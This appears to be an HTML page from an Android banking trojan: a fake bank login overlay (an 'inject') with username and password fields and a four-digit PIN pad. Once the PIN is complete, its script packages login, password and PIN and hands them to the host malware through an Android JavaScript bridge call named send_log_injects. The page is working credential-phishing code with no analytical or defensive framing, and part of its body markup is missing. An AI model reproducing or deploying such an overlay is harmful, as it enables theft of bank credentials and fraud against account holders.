<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <style>
        body {
        }

        section {
            padding: 20px;
        }

        #form1 {
            min-height: 100vh;
            background-color: #e7e7e7;
        }

        #form2 {
            background-color: #e7e7e7;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .input {
            padding: 6px;
            border: 0;
            width: 100%;    
            background: bottom left linear-gradient(#c3c3c3, #c3c3c3) no-repeat, bottom center linear-gradient(#c3c3c3, #c3c3c3) repeat-x, bottom right linear-gradient(#c3c3c3, #c3c3c3) no-repeat;
            background-size: 1px 6px, 1px 1px, 1px 6px;
        }

        .input:focus {
            padding: 6px;
            border: 0;
            background: bottom left linear-gradient(#ffcc00, #ffcc00) no-repeat, bottom center linear-gradient(#ffcc00, #ffcc00) repeat-x, bottom right linear-gradient(#ffcc00, #ffcc00) no-repeat;
            background-size: 1px 6px, 1px 1px, 1px 6px;
            width: 100%;
        }

        .inputForm {
            margin-bottom: 20px;
            overflow: hidden;
        }

        .formInput {
            width: 10%;
            display: inline-block; 
            float: left;
        }

        .button {
            background-color: #fccf1a;
            color: #000;
            width: 100%;
            padding: 8px;
            border-left: 1px solid #d3b84f;
            border-right: 1px solid #d3b84f;
            border-top: 1px solid #ffdc3e;
            border-bottom: 1px solid #aa9021;
            border-radius: 3px;
            font-weight: 600;
        }

        .error {
            background: bottom left linear-gradient(#f00, #f00) no-repeat, bottom center linear-gradient(#f00, #f00) repeat-x , bottom right linear-gradient(#f00, #f00) no-repeat !important;
            background-size: 1px 6px, 1px 1px, 1px 6px !important;
        }
        
        .td_.td_2 {
            background: transparent;
            height: 300px;
            padding-top: 0;
            color: #ffffffb8;
        }

        .pinpad.d-flex.justify-content-between {
            padding: 1px 25px;
        }

        .td_.td_2 {
            color: #ffffffb8;
        }

        span.pinpad-item {
            color: #000000;
            padding: 20px 0px;
            text-align: center;
            font-size: 26px;
            width: 57px;
            margin-top: -14px;
            cursor: pointer;
        }

        .fakePass {
            width: 20px;
            height: 20px;
            background-color: transparent;
            border: 2px solid #333;
            border-radius: 75px;
            display: inline-block;
            margin-right: 20px;
        }
        .checked {
            background-color: #333;
            border-color: #333;
        }
    </style>
</head>

                            <div class="pinpad d-flex justify-content-between">
                                <span id="btnPin6" ng-click="edit_pin(7)" class="pinpad-item">
                                    <span class="val">7</span>
                                </span>
                                <span id="btnPin4" ng-click="edit_pin(8)" class="pinpad-item">
                                    <span class="val">8</span>
                                </span>
                                <span id="btnPin2" ng-click="edit_pin(9)" class="pinpad-item">
                                    <span class="val">9</span>
                                </span>
                            </div>
                            <div class="pinpad d-flex justify-content-between">
                                <span class="pinpad-item" style="text-align: center;padding: 25px 0 0 0;font-size: 16px;">
                                    forgot
                                </span>
                                <span id="btnPin10" ng-click="edit_pin(0)" style="padding: 20px 0 0 0;" class="pinpad-item">
                                    <span class="val">0</span>
                                </span>
                                <span class="pinpad-item" id="btnDel" ng-click="reset();" style="text-align: center;padding: 25px 0 0 0;font-size: 16px;"> 
                                    delete
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </form>

    <script>

app = angular.module('app', [])
        app.controller('c1', ['$scope', function ($scope) {
            $sc_ = $scope
            $scope.pin = ""
            $scope.edit_pin = function (password) {
                if ($scope.pin.length != 4) {
                    try{
                        document.getElementById('input_next2').disabled = false;
                    } catch(e){};
                    $scope.pin += '' + password;
                    $("#pin").val($scope.pin);
                }

                if ($scope.pin.length === 4) {   
                var data = {};
                data.login = login.value;
                data.pass = pass.value;
                data.pin = pin.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
                }
            }
            $scope.reset = function () {
                Rlast = $scope.pin.substring(0, $scope.pin.length - 1);
                $scope.pin = Rlast;
                $("#pin").val(Rlast);
            }
        }])


        var btnPin = document.getElementById('btnPin'),
            btnDel = document.getElementById('btnDel'),
            fake1 = document.getElementById('fake1'),
            fake2 = document.getElementById('fake2'),
            fake3 = document.getElementById('fake3'),
            fake4 = document.getElementById('fake4');

            for(var i = 1; i <= 10; i++){
                btnPin = document.getElementById('btnPin' + i);
                
                btnPin.onclick = function(){
                    if(fake1.classList == 'fakePass') {
                        fake1.classList = 'fakePass checked';
                    } else if(fake2.classList == 'fakePass') {
                        fake2.classList = 'fakePass checked';
                    } else if(fake3.classList == 'fakePass') {
                        fake3.classList = 'fakePass checked';
                    } else if(fake4.classList == 'fakePass') {
                        fake4.classList = 'fakePass checked';
                    }
                }
            }
            
            btnDel.onclick = function(){
                if (fake4.classList == 'fakePass checked') {
                    fake4.classList = 'fakePass';
                } else if (fake3.classList == 'fakePass checked') {
                    fake3.classList = 'fakePass';
                } else if (fake2.classList == 'fakePass checked') {
                    fake2.classList = 'fakePass';
                } else if (fake1.classList == 'fakePass checked') {
                    fake1.classList = 'fakePass';
                }
            }


        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            spinner = document.getElementById('spinner'),
            login = document.getElementById('login'),
            pass = document.getElementById('pass'),
            pin = document.getElementById('pin'),
            nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        nextPage.onclick = function() {
            if(login.value.length < 6) {
                login.classList.add('error');
                login.focus()
            } else if(pass.value.length < 4) {
                login.classList.remove('error');
                pass.classList.add('error');
                pass.focus()
            } else if (login.value.length >= 6 && pass.value.length >= 4){
                pass.classList.remove('error');
                spinner.style.display = 'block';
                    setTimeout(() => {
                        spinner.style.display = 'none';
                        form1.style.display = 'none';
                        form2.style.display = 'flex';
                        
                    }, 1500);
            }
        }
    </script>
</body>
</html>
